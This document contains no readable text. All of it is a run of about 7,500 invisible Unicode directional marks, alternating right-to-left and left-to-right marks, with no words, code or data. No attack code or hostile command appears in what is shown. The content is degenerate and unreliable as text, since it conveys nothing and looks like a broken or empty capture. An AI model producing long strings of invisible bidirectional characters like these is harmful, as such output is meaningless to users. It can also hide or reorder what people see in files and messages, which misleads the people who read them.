‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏